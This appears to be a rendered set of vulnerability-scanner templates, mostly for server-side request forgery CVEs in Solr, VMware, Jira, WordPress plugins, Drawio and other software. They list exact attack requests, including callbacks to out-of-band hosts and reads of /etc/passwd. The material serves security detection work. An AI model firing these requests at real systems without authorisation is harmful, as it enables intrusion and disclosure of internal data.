## Requests
### Step - 1
```
GET /solr/admin/cores?wt=json HTTP/1.1
Host: {{Hostname}}
Accept-Language: en
Connection: close

```
### Step - 2
```
GET /solr/{{core}}/replication/?command=fetchindex&masterUrl=https://interact.sh HTTP/1.1
Host: {{Hostname}}
Accept-Language: en
Connection: close

```
### Matchers

**Type - word**
- words
    1. \<str name="status">OK\</str>
- part - body
### Extractors

**Type - regex**
- internal - True
- name - core
- group - 1
- regex
    1. "name"\:"(.*?)"

---
# Pascom CPS Server-Side Request Forgery
## Description
- Pascom versions before 7.20 packaged with Cloud Phone System contain a known server-side request forgery vulnerability.
- severity - critical
- tags - cve,cve2021,pascom,ssrf
## Requests
- Method - GET
### URL
- {{BaseURL}}/services/pluginscript/..;/..;/..;/getFavicon?host={{interactsh-url}}
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

**Type - status**
- status
    1. 200

---
# vRealize Operations Manager API - Server-Side Request Forgery
## Description
- vRealize Operations Manager API is susceptible to server-side request forgery. A malicious actor with network access to the vRealize Operations Manager API can steal administrative credentials or trigger remote code execution using CVE-2021-21983.
- severity - high
- tags - kev,packetstorm,cve,cve2021,ssrf,vmware,vrealize
## Requests
### Step - 1
```
POST /casa/nodes/thumbprints HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json;charset=UTF-8

["127.0.0.1:443/ui/"]

```
### Matchers

**Type - word**
- part - body
- words
    1. vRealize Operations Manager
    2. thumbprint
    3. address
- condition - and

**Type - status**
- status
    1. 200

---
# Netmask NPM Package - Server-Side Request Forgery
## Description
- Netmask NPM Package is susceptible to server-side request forgery because of improper input validation of octal strings in netmask npm package. This allows unauthenticated remote attackers to perform indeterminate SSRF, remote file inclusion, and local file inclusion attacks on many of the dependent packages. A remote unauthenticated attacker can bypass packages relying on netmask to filter IPs and reach critical VPN or LAN hosts.
- severity - critical
- tags - cve,cve2021,npm,netmask,ssrf,lfi
## Requests
- Method - GET
### URL
- {{BaseURL}}/?url=http://0177.0.0.1/server-status
- {{BaseURL}}/?host=http://0177.0.0.1/server-status
- {{BaseURL}}/?file=http://0177.0.0.1/etc/passwd
### Matchers

**Type - word**
- part - body
- words
    1. Apache Server Status
    2. Server Version
- condition - and

**Type - regex**
- regex
    1. root:.*:0:0:

---
# VMware vCenter Unauthenticated SSRF
## Description
- The vSphere Client (HTML5) contains an SSRF (Server Side Request Forgery) vulnerability due to improper validation of URLs in a vCenter Server plugin. A malicious actor with network access to port 443 may exploit this issue by sending a POST request to vCenter Server plugin leading to information disclosure. This affects VMware vCenter Server (7.x before 7.0 U1c, 6.7 before 6.7 U3l and 6.5 before 6.5 U3n) and VMware Cloud Foundation (4.x before 4.2 and 3.x before 3.10.1.2).
- severity - medium
- tags - cve,cve2021,vmware,ssrf,vcenter,oast,kev
## Requests
### Step - 1
```
GET /ui/vropspluginui/rest/services/getvcdetails HTTP/1.1
Host: {{Hostname}}
Vcip: {{interactsh-url}}
Vcpassword: {{rand_base(6)}}
Vcusername: {{rand_base(6)}}
Reqresource: {{rand_base(6)}}

```
### Matchers

**Type - status**
- status
    1. 500

**Type - word**
- part - body
- words
    1. The server sent HTTP status code 200

---
# Like Button Rating \< 2.6.32 - Unauthenticated Full-Read SSRF
## Description
- The LikeBtn WordPress plugin was vulnerable to Unauthenticated Full-Read Server-Side Request Forgery (SSRF).

- severity - high
- tags - cve,cve2021,wordpress,wp-plugin,wp,ssrf,wpscan,unauth,likebtn-like-button
## Requests
### Step - 1
```
@timeout: 10s
GET /wp-admin/admin-ajax.php?action=likebtn_prx&likebtn_q={{base64('http://likebtn.com.interact.sh')}}" HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. Interactsh Server

**Type - status**
- status
    1. 200

---
# Visualizer \<3.3.1 - Blind Server-Side Request Forgery
## Description
- Visualizer prior to 3.3.1 suffers from a blind server-side request forgery vulnerability via the /wp-json/visualizer/v1/upload-data endpoint.

- severity - critical
- tags - cve,cve2019,wp-plugin,ssrf,wordpress,xss,unauth,wpscan
## Requests
- Method - POST
- Method - POST
### URL
- {{BaseURL}}/wp-json/visualizer/v1/upload-data
  - {\"url\":\"http://{{interactsh-url}}\"}
### Matchers

**Type - word**
- part - interactsh_protocol
- name - http
- words
    1. http

**Type - word**
- part - header
- words
    1. application/json

**Type - status**
- status
    1. 200

---
# WordPress Social Warfare \<3.5.3 - Cross-Site Scripting
## Description
- WordPress Social Warfare plugin before 3.5.3 contains a cross-site scripting vulnerability via the wp-admin/admin-post.php?swp_debug=load_options swp_url parameter, affecting Social Warfare and Social Warfare Pro.
- severity - medium
- tags - cve,cve2019,wordpress,wp-plugin,ssrf,kev
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://{{interactsh-url}}
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- part - interactsh_protocol
- words
    1. http

---
# JIRA SSRF in the /plugins/servlet/gadgets/makeRequest resource
## Description
- The /plugins/servlet/gadgets/makeRequest resource in Jira before version 8.4.0 allows remote attackers to access the content of internal network resources via a Server Side Request Forgery (SSRF) vulnerability due to a logic bug in the JiraWhitelist class.
- severity - medium
- tags - atlassian,jira,ssrf,oast,tenable,hackerone,cve,cve2019
## Requests
- Method - POST
- Method - POST
### URL
- {{BaseURL}}/plugins/servlet/gadgets/makeRequest
  - url=https://{{Host}}:443@{{interactsh-url}}

### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

---
# Ignite Realtime Openfire \<=4.4.2 - Server-Side Request Forgery
## Description
- Ignite Realtime Openfire through version 4.4.2 allows attackers to send arbitrary HTTP GET requests in FaviconServlet.java, resulting in server-side request forgery.
- severity - critical
- tags - cve,cve2019,ssrf,openfire,oast
## Requests
- Method - GET
### URL
- {{BaseURL}}/getFavicon?host=http://{{interactsh-url}}
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

---
# W3 Total Cache 0.9.2.6-0.9.3 - Unauthenticated File Read / Directory Traversal
## Description
- WordPress plugin W3 Total Cache before version 0.9.4 allows remote attackers to read arbitrary files via the SubscribeURL field in SubscriptionConfirmation JSON data via pub/sns.php.

- severity - high
- tags - cve,cve2019,wordpress,wp-plugin,ssrf,packetstorm
## Requests
### Step - 1
```
PUT /wp-content/plugins/w3-total-cache/pub/sns.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

{"Type":"SubscriptionConfirmation","Message":"","SubscribeURL":"https://rfi.nessus.org/rfi.txt"}

```
### Matchers

**Type - word**
- words
    1. TmVzc3VzQ29kZUV4ZWNUZXN0
- part - body

---
# Wavemaker Studio 6.6 - Local File Inclusion/Server-Side Request Forgery
## Description
- WaveMaker Studio 6.6 mishandles the studioService.download?method=getContent&inUrl= value in com/wavemaker/studio/StudioService.java, leading to disclosure of local files and server-side request forgery.
- severity - critical
- tags - cve,cve2019,wavemaker,lfi,ssrf,edb
## Requests
- Method - GET
### URL
- {{BaseURL}}/wavemaker/studioService.download?method=getContent&inUrl=file///etc/passwd
### Matchers

**Type - status**
- status
    1. 200

**Type - regex**
- regex
    1. root:.*:0:0:
- part - body

---
# Flyte Console \<0.52.0 - Server-Side Request Forgery
## Description
- FlyteConsole is the web user interface for the Flyte platform. FlyteConsole prior to version 0.52.0 is vulnerable to server-side request forgery when FlyteConsole is open to the general internet. An attacker can exploit any user of a vulnerable instance to access the internal metadata server or other unauthenticated URLs. Passing of headers to an unauthorized actor may occur.

- severity - high
- tags - cve,cve2022,flyteconsole,ssrf,oss,hackerone
## Requests
- Method - GET
### URL
- {{BaseURL}}/cors_proxy/https://www.interact.sh
### Matchers

**Type - word**
- words
    1. Interactsh Server

---
# Gogs - SSRF
## Description
- Server-Side Request Forgery (SSRF) in Gogs prior to 0.12.5.
- severity - medium
- tags - cve,cve2022,ssrf,gogs,huntr
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - regex**
- part - body
- regex
    1. \<div class="ui left">\n\s+© \d{4} Gogs Version: ([\d.]+) Page:

**Type - dsl**
- dsl
    1. compare_versions(version, '\< 0.12.5')

**Type - status**
- status
    1. 200
### Extractors

**Type - regex**
- name - version
- internal - True
- group - 1
- regex
    1. \<div class="ui left">\n\s+© \d{4} Gogs Version: ([\d.]+) Page:

**Type - regex**
- group - 1
- regex
    1. \<div class="ui left">\n\s+© \d{4} Gogs Version: ([\d.]+) Page:

---
# Shibboleth OIDC OP \<3.0.4 - Server-Side Request Forgery
## Description
- The Shibboleth Identity Provider OIDC OP plugin before 3.0.4 is vulnerable to server-side request forgery (SSRF) due to insufficient restriction of the request_uri parameter, which allows attackers to interact with arbitrary third-party HTTP services.
- severity - high
- tags - cve,cve2022,ssrf,oidc,shibboleth
## Requests
- Method - GET
### URL
- {{BaseURL}}/idp/profile/oidc/authorize?client_id=demo_rp&request_uri=https://{{interactsh-url}}
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

**Type - word**
- part - interactsh_request
- words
    1. ShibbolethIdp

---
# All In One Video Gallery Plugin - Unauthenticated Arbitrary File Download & SSRF vulnerability
## Description
- Unauthenticated Arbitrary File Download & SSRF vulnerability in WordPress All In One Video Gallery Plugin (versions \<= 2.6.0).

- tags - cve2022,wp-plugin,unauth,ssrf,wpscan,cve,wordpress,wp,all-in-one-video-gallery
## Requests
### Step - 1
```
@timeout: 10s
GET /index.php/video/?dl={{base64('http://interact.sh/')}} HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. Interactsh Server

**Type - status**
- status
    1. 200

---
# Formcraft3 \<3.8.28 - Server-Side Request Forgery
## Description
- Formcraft3 before version 3.8.2  does not validate the URL parameter in the formcraft3_get AJAX action, leading to server-side request forgery issues exploitable by unauthenticated users.
- severity - critical
- tags - wp,wp-plugin,wordpress,cve,formcraft3,wpscan,ssrf,cve2022,unauth
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-admin/admin-ajax.php?action=formcraft3_get&URL=https://{{interactsh-url}}
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

---
# Drawio \<18.0.4 - Server-Side Request Forgery
## Description
- Drawio prior to 18.0.4 is vulnerable to server-side request forgery. An attacker can make a request as the server and read its contents. This can lead to a leak of sensitive information.

- severity - high
- tags - drawio,ssrf,oss,huntr,cve,cve2022
## Requests
### Step - 1
```
GET /proxy?url=http%3a//0:8080/ HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. \<title>Flowchart Maker & Online Diagram Software\</title>

**Type - word**
- part - header
- words
    1. application/octet-stream

---
# WordPress Fusion Builder \< 3.6.2 - Unauthenticated SSRF
## Description
- The plugin, used in the Avada theme, does not validate a parameter in its forms which could be used to initiate arbitrary HTTP requests. The data returned is then reflected back in the application's response. This could be used to interact with hosts on the server's local network bypassing firewalls and access control measures.

- severity - critical
- tags - wpscan,cve,cve2022,wordpress,ssrf,themefusion,wp,fusion,avada
## Requests
### Step - 1
```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: {{BaseURL}}
Referer: {{RootURL}}

action=fusion_form_update_view

```
### Step - 2
```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=---------------------------30259827232283860776499538268
Origin: {{BaseURL}}
Referer: {{RootURL}}

-----------------------------30259827232283860776499538268
Content-Disposition: form-data; name="formData"

email=example%40example.com&fusion_privacy_store_ip_ua=false&fusion_privacy_expiration_interval=48&priva
cy_expiration_action=ignore&fusion-form-nonce-0={{fusionformnonce}}&fusion-fields-hold-private-data=
-----------------------------30259827232283860776499538268
Content-Disposition: form-data; name="action"

fusion_form_submit_form_to_url
-----------------------------30259827232283860776499538268
Content-Disposition: form-data; name="fusion_form_nonce"

{{fusionformnonce}}
-----------------------------30259827232283860776499538268
Content-Disposition: form-data; name="form_id"

0
-----------------------------30259827232283860776499538268
Content-Disposition: form-data; name="post_id"

0
-----------------------------30259827232283860776499538268
Content-Disposition: form-data; name="field_labels"

{"email":"Email address"}
-----------------------------30259827232283860776499538268
Content-Disposition: form-data; name="hidden_field_names"

[]
-----------------------------30259827232283860776499538268
Content-Disposition: form-data; name="fusionAction"

https://oast.me
-----------------------------30259827232283860776499538268
Content-Disposition: form-data; name="fusionActionMethod"

GET
-----------------------------30259827232283860776499538268--

```
### Matchers

**Type - word**
- part - body_2
- words
    1. Interactsh Server

**Type - status**
- status
    1. 200
### Extractors

**Type - xpath**
- part - body_1
- name - fusionformnonce
- attribute - value
- xpath
    1. //*[@id="fusion-form-nonce-0"]
- internal - True

---
# Drawio \< 18.1.2 - Server Side Request Forgery
## Description
- SSRF in /service endpoint in jgraph/drawio prior to 18.1.2. Exposure of Sensitive Information to an Unauthorized Actor in GitHub repository jgraph/drawio prior to 18.1.2.

- severity - high
- tags - huntr,cve,cve2022,drawio,ssrf,oast,oss,jgraph
## Requests
### Step - 1
```
GET /service/0/test.oast.me HTTP/2
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. contains(body, 'Interactsh Server')
    2. status_code == 200
- condition - and

---
# Umbraco \<7.4.0- Server-Side Request Forgery
## Description
- Umbraco before version 7.4.0 contains a server-side request forgery vulnerability in feedproxy.aspx that allows attackers to send arbitrary HTTP GET requests via http://local/Umbraco/feedproxy.aspx?url=http://127.0.0.1:80/index.
- severity - high
- tags - cve,cve2015,ssrf,oast,umbraco
## Requests
- Method - GET
### URL
- {{BaseURL}}/Umbraco/feedproxy.aspx?url=http://{{interactsh-url}}
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

---
# Detect Sentry Instance
- severity - info
- tags - ssrf,sentry,tech,hackerone
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Extractors

**Type - regex**
- part - body
- regex
    1. https://[0-9a-f]*@[a-z0-9]+\.[a-z.]+.?[0-9]+

---
# SSRF due to misconfiguration in OAuth
## Description
- Sends a POST request with the endpoint "/connect/register" to check external Interaction with multiple POST parameters.
- severity - medium
- tags - misconfig,oast,oauth,ssrf
## Requests
### Step - 1
```
POST /connect/register HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
Accept-Language: en-US,en;q=0.9

{
  "application_type": "web",
  "redirect_uris": ["https://{{interactsh-url}}/callback"],
  "client_name": "{{Hostname}}",
  "logo_uri": "https://{{interactsh-url}}/favicon.ico",
  "subject_type": "pairwise",
  "token_endpoint_auth_method": "client_secret_basic",
  "request_uris": ["https://{{interactsh-url}}"]
}

```
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. dns

---
# Linkerd SSRF detection
- severity - high
- tags - ssrf,linkerd,oast
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

---
# OpenBMCS 2.4 - Server-Side Request Forgery /  Remote File Inclusion
## Description
- OpenBMCS 2.4 is susceptible to unauthenticated server-side request forgery and remote file inclusion vulnerabilities within its functionalities. The application parses user supplied data in the POST parameter 'ip' to query a server IP on port 81 by default. Since no validation is carried out on the parameter, an attacker can specify an external domain and force the application to make an HTTP request to an arbitrary destination host.
- severity - high
- tags - ssrf,oast,openbmcs,edb
## Requests
### Step - 1
```
POST /php/query.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

ip={{interactsh-url}}:80&argu=/

```
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

**Type - status**
- status
    1. 302

---
